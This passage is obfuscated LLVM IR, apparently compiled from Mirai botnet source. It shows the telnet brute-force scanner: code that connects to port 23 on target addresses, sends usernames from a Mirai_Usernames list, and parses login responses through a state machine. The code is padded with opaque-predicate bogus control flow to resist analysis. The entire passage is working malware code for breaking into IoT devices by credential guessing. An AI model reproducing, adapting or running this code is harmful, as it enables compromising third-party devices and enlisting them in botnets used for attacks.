  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %268

; <label>:268:                                    ; preds = %originalBBpart220, %189
  br label %269

; <label>:269:                                    ; preds = %268, %169
  %270 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %270, align 4
  %271 = call zeroext i16 @htons(i16 zeroext 23) #10
  %272 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %271, i16* %272, align 2
  %273 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %274 = getelementptr inbounds [8 x i8], [8 x i8]* %273, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %274, i8 0, i64 8, i32 4, i1 false)
  %275 = load i32, i32* %6, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 2
  %279 = load i32, i32* %278, align 8
  %280 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %281 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %280, i32 0, i32 0
  store i32 %279, i32* %281, align 4
  %282 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %283 = load i32, i32* %6, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %284
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %285, i32 0, i32 0
  store i32 %282, i32* %286, align 8
  %287 = load i32, i32* %6, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 0
  %291 = load i32, i32* %290, align 8
  %292 = icmp eq i32 %291, -1
  br i1 %292, label %293, label %294

; <label>:293:                                    ; preds = %269
  br label %1348

; <label>:294:                                    ; preds = %269
  %295 = load i32, i32* @x.93
  %296 = load i32, i32* @y.94
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %294
  %303 = load i32, i32* %6, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 8
  %308 = load i32, i32* %6, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 8
  %313 = call i32 (i32, i32, ...) @fcntl(i32 %312, i32 3, i8* null)
  %314 = or i32 %313, 2048
  %315 = call i32 (i32, i32, ...) @fcntl(i32 %307, i32 4, i32 %314)
  %316 = load i32, i32* %6, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 0
  %320 = load i32, i32* %319, align 8
  %321 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %322 = call i32 @connect(i32 %320, %struct.sockaddr* %321, i32 16)
  %323 = icmp eq i32 %322, -1
  %324 = load i32, i32* @x.93
  %325 = load i32, i32* @y.94
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBBpart234, label %originalBB22alteredBB

originalBBpart234:                                ; preds = %originalBB22
  br i1 %323, label %332, label %340

; <label>:332:                                    ; preds = %originalBBpart234
  %333 = call i32* @__errno_location() #10
  %334 = load i32, i32* %333, align 4
  %335 = icmp ne i32 %334, 115
  br i1 %335, label %336, label %340

; <label>:336:                                    ; preds = %332
  %337 = load i32, i32* %6, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %338
  call void @reset_telstate(%struct.telstate_t* %339)
  br label %360

; <label>:340:                                    ; preds = %332, %originalBBpart234
  %341 = load i32, i32* @x.93
  %342 = load i32, i32* @y.94
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %340
  %349 = load i32, i32* %6, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %350
  call void @advance_telstate(%struct.telstate_t* %351, i32 1)
  %352 = load i32, i32* @x.93
  %353 = load i32, i32* @y.94
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %360

; <label>:360:                                    ; preds = %originalBBpart238, %336
  %361 = load i32, i32* @x.93
  %362 = load i32, i32* @y.94
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %360
  %369 = load i32, i32* @x.93
  %370 = load i32, i32* @y.94
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %1331

; <label>:377:                                    ; preds = %138
  %378 = load i32, i32* @x.93
  %379 = load i32, i32* @y.94
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %377
  %386 = load i32, i32* @x.93
  %387 = load i32, i32* @y.94
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %394

; <label>:394:                                    ; preds = %originalBBpart246
  %395 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %396 = getelementptr inbounds [16 x i64], [16 x i64]* %395, i64 0, i64 0
  %397 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %396) #5, !srcloc !7
  %398 = extractvalue { i64, i64* } %397, 0
  %399 = extractvalue { i64, i64* } %397, 1
  %400 = trunc i64 %398 to i32
  store i32 %400, i32* %21, align 4
  %401 = ptrtoint i64* %399 to i64
  %402 = trunc i64 %401 to i32
  store i32 %402, i32* %22, align 4
  br label %403

; <label>:403:                                    ; preds = %394
  %404 = load i32, i32* @x.93
  %405 = load i32, i32* @y.94
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %403
  %412 = load i32, i32* @x.93
  %413 = load i32, i32* @y.94
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %420

; <label>:420:                                    ; preds = %originalBBpart250
  %421 = load i32, i32* %6, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %422
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %423, i32 0, i32 0
  %425 = load i32, i32* %424, align 8
  %426 = srem i32 %425, 64
  %427 = zext i32 %426 to i64
  %428 = shl i64 1, %427
  %429 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %430 = load i32, i32* %6, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 8
  %435 = sdiv i32 %434, 64
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds [16 x i64], [16 x i64]* %429, i64 0, i64 %436
  %438 = load i64, i64* %437, align 8
  %439 = or i64 %438, %428
  store i64 %439, i64* %437, align 8
  %440 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %440, align 8
  %441 = load i32, i32* %3, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %442, i64* %443, align 8
  %444 = load i32, i32* %6, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 0
  %448 = load i32, i32* %447, align 8
  %449 = add nsw i32 %448, 1
  %450 = call i32 @select(i32 %449, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %450, i32* %7, align 4
  %451 = load i32, i32* %7, align 4
  %452 = icmp eq i32 %451, 1
  br i1 %452, label %453, label %507

; <label>:453:                                    ; preds = %420
  %454 = load i32, i32* @x.93
  %455 = load i32, i32* @y.94
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %453
  %462 = call i64 @time(i64* null) #5
  %463 = trunc i64 %462 to i32
  %464 = load i32, i32* %6, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 9
  store i32 %463, i32* %467, align 8
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %468 = load i32, i32* %6, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 0
  %472 = load i32, i32* %471, align 8
  %473 = bitcast i32* %15 to i8*
  %474 = call i32 @getsockopt(i32 %472, i32 1, i32 4, i8* %473, i32* %14) #5
  %475 = load i32, i32* %15, align 4
  %476 = icmp ne i32 %475, 0
  %477 = load i32, i32* @x.93
  %478 = load i32, i32* @y.94
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %476, label %485, label %489

; <label>:485:                                    ; preds = %originalBBpart254
  %486 = load i32, i32* %6, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %487
  call void @reset_telstate(%struct.telstate_t* %488)
  br label %506

; <label>:489:                                    ; preds = %originalBBpart254
  %490 = load i32, i32* %6, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 0
  %494 = load i32, i32* %493, align 8
  %495 = load i32, i32* %6, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %496
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %497, i32 0, i32 0
  %499 = load i32, i32* %498, align 8
  %500 = call i32 (i32, i32, ...) @fcntl(i32 %499, i32 3, i8* null)
  %501 = and i32 %500, -2049
  %502 = call i32 (i32, i32, ...) @fcntl(i32 %494, i32 4, i32 %501)
  %503 = load i32, i32* %6, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %504
  call void @advance_telstate(%struct.telstate_t* %505, i32 2)
  br label %506

; <label>:506:                                    ; preds = %489, %485
  br label %1348

; <label>:507:                                    ; preds = %420
  %508 = load i32, i32* @x.93
  %509 = load i32, i32* @y.94
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %507
  %516 = load i32, i32* %7, align 4
  %517 = icmp eq i32 %516, -1
  %518 = load i32, i32* @x.93
  %519 = load i32, i32* @y.94
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %517, label %526, label %530

; <label>:526:                                    ; preds = %originalBBpart258
  %527 = load i32, i32* %6, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %528
  call void @reset_telstate(%struct.telstate_t* %529)
  br label %1348

; <label>:530:                                    ; preds = %originalBBpart258
  br label %531

; <label>:531:                                    ; preds = %530
  %532 = load i32, i32* @x.93
  %533 = load i32, i32* @y.94
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %531
  %540 = load i32, i32* %6, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 9
  %544 = load i32, i32* %543, align 8
  %545 = add i32 %544, 7
  %546 = zext i32 %545 to i64
  %547 = call i64 @time(i64* null) #5
  %548 = icmp slt i64 %546, %547
  %549 = load i32, i32* @x.93
  %550 = load i32, i32* @y.94
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBBpart269, label %originalBB60alteredBB

originalBBpart269:                                ; preds = %originalBB60
  br i1 %548, label %557, label %561

; <label>:557:                                    ; preds = %originalBBpart269
  %558 = load i32, i32* %6, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %559
  call void @reset_telstate(%struct.telstate_t* %560)
  br label %561

; <label>:561:                                    ; preds = %557, %originalBBpart269
  br label %1331

; <label>:562:                                    ; preds = %138
  %563 = load i32, i32* %6, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %564
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %565, i32 0, i32 0
  %567 = load i32, i32* %566, align 8
  %568 = load i32, i32* %3, align 4
  %569 = load i32, i32* %6, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 11
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @read_until_response(i32 %567, i32 %568, i8* %573, i32 1024, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %575 = icmp ne i32 %574, 0
  br i1 %575, label %576, label %647

; <label>:576:                                    ; preds = %562
  %577 = load i32, i32* @x.93
  %578 = load i32, i32* @y.94
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %576
  %585 = call i64 @time(i64* null) #5
  %586 = trunc i64 %585 to i32
  %587 = load i32, i32* %6, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 9
  store i32 %586, i32* %590, align 8
  %591 = load i32, i32* %6, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 11
  %595 = load i8*, i8** %594, align 8
  %596 = call i32 @contains_fail(i8* %595)
  %597 = icmp ne i32 %596, 0
  %598 = load i32, i32* @x.93
  %599 = load i32, i32* @y.94
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %597, label %606, label %610

; <label>:606:                                    ; preds = %originalBBpart273
  %607 = load i32, i32* %6, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %608
  call void @advance_telstate(%struct.telstate_t* %609, i32 0)
  br label %630

; <label>:610:                                    ; preds = %originalBBpart273
  %611 = load i32, i32* @x.93
  %612 = load i32, i32* @y.94
  %613 = sub i32 %611, 1
  %614 = mul i32 %611, %613
  %615 = urem i32 %614, 2
  %616 = icmp eq i32 %615, 0
  %617 = icmp slt i32 %612, 10
  %618 = or i1 %616, %617
  br i1 %618, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %610
  %619 = load i32, i32* %6, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %620
  call void @advance_telstate(%struct.telstate_t* %621, i32 3)
  %622 = load i32, i32* @x.93
  %623 = load i32, i32* @y.94
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %630

; <label>:630:                                    ; preds = %originalBBpart277, %606
  %631 = load i32, i32* @x.93
  %632 = load i32, i32* @y.94
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %630
  %639 = load i32, i32* @x.93
  %640 = load i32, i32* @y.94
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %1348

; <label>:647:                                    ; preds = %562
  %648 = load i32, i32* %6, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 9
  %652 = load i32, i32* %651, align 8
  %653 = add i32 %652, 7
  %654 = zext i32 %653 to i64
  %655 = call i64 @time(i64* null) #5
  %656 = icmp slt i64 %654, %655
  br i1 %656, label %657, label %677

; <label>:657:                                    ; preds = %647
  %658 = load i32, i32* @x.93
  %659 = load i32, i32* @y.94
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %657
  %666 = load i32, i32* %6, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %667
  call void @reset_telstate(%struct.telstate_t* %668)
  %669 = load i32, i32* @x.93
  %670 = load i32, i32* @y.94
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %677

; <label>:677:                                    ; preds = %originalBBpart285, %647
  %678 = load i32, i32* @x.93
  %679 = load i32, i32* @y.94
  %680 = sub i32 %678, 1
  %681 = mul i32 %678, %680
  %682 = urem i32 %681, 2
  %683 = icmp eq i32 %682, 0
  %684 = icmp slt i32 %679, 10
  %685 = or i1 %683, %684
  br i1 %685, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %677
  %686 = load i32, i32* @x.93
  %687 = load i32, i32* @y.94
  %688 = sub i32 %686, 1
  %689 = mul i32 %686, %688
  %690 = urem i32 %689, 2
  %691 = icmp eq i32 %690, 0
  %692 = icmp slt i32 %687, 10
  %693 = or i1 %691, %692
  br i1 %693, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %1331

; <label>:694:                                    ; preds = %138
  %695 = load i32, i32* %6, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 0
  %699 = load i32, i32* %698, align 8
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 5
  %704 = load i8, i8* %703, align 2
  %705 = zext i8 %704 to i64
  %706 = getelementptr inbounds [63 x i8*], [63 x i8*]* @Mirai_Usernames, i64 0, i64 %705
  %707 = load i8*, i8** %706, align 8
  %708 = load i32, i32* %6, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 5
  %712 = load i8, i8* %711, align 2
  %713 = zext i8 %712 to i64
  %714 = getelementptr inbounds [63 x i8*], [63 x i8*]* @Mirai_Usernames, i64 0, i64 %713
  %715 = load i8*, i8** %714, align 8
  %716 = call i64 @strlen(i8* %715) #9
  %717 = call i64 @send(i32 %699, i8* %707, i64 %716, i32 16384)
  %718 = icmp slt i64 %717, 0
  br i1 %718, label %719, label %723

; <label>:719:                                    ; preds = %694
  %720 = load i32, i32* %6, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %721
  call void @reset_telstate(%struct.telstate_t* %722)
  br label %1348

; <label>:723:                                    ; preds = %694
  %724 = load i32, i32* %6, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %725
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %726, i32 0, i32 0
  %728 = load i32, i32* %727, align 8
  %729 = call i64 @send(i32 %728, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %730 = icmp slt i64 %729, 0
  br i1 %730, label %731, label %735

; <label>:731:                                    ; preds = %723
  %732 = load i32, i32* %6, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %733
  call void @reset_telstate(%struct.telstate_t* %734)
  br label %1348

; <label>:735:                                    ; preds = %723
  %736 = load i32, i32* @x.93
  %737 = load i32, i32* @y.94
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %735
  %744 = load i32, i32* %6, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %745
  call void @advance_telstate(%struct.telstate_t* %746, i32 4)
  %747 = load i32, i32* @x.93
  %748 = load i32, i32* @y.94
  %749 = sub i32 %747, 1
  %750 = mul i32 %747, %749
  %751 = urem i32 %750, 2
  %752 = icmp eq i32 %751, 0
  %753 = icmp slt i32 %748, 10
  %754 = or i1 %752, %753
  br i1 %754, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %1331

; <label>:755:                                    ; preds = %138
  %756 = load i32, i32* %6, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 0
  %760 = load i32, i32* %759, align 8
  %761 = load i32, i32* %3, align 4
  %762 = load i32, i32* %6, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %763
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %764, i32 0, i32 11
  %766 = load i8*, i8** %765, align 8
  %767 = call i32 @read_until_response(i32 %760, i32 %761, i8* %766, i32 1024, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %768 = icmp ne i32 %767, 0
  br i1 %768, label %769, label %824

; <label>:769:                                    ; preds = %755
  %770 = call i64 @time(i64* null) #5
  %771 = trunc i64 %770 to i32
  %772 = load i32, i32* %6, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 9
  store i32 %771, i32* %775, align 8
  %776 = load i32, i32* %6, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 11
  %780 = load i8*, i8** %779, align 8
  %781 = call i32 @contains_fail(i8* %780)
  %782 = icmp ne i32 %781, 0
  br i1 %782, label %783, label %787

; <label>:783:                                    ; preds = %769
  %784 = load i32, i32* %6, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %785
  call void @advance_telstate(%struct.telstate_t* %786, i32 0)
  br label %807

; <label>:787:                                    ; preds = %769
  %788 = load i32, i32* @x.93
  %789 = load i32, i32* @y.94
  %790 = sub i32 %788, 1
  %791 = mul i32 %788, %790
  %792 = urem i32 %791, 2
  %793 = icmp eq i32 %792, 0
  %794 = icmp slt i32 %789, 10
  %795 = or i1 %793, %794
  br i1 %795, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %787
  %796 = load i32, i32* %6, align 4
  %797 = sext i32 %796 to i64
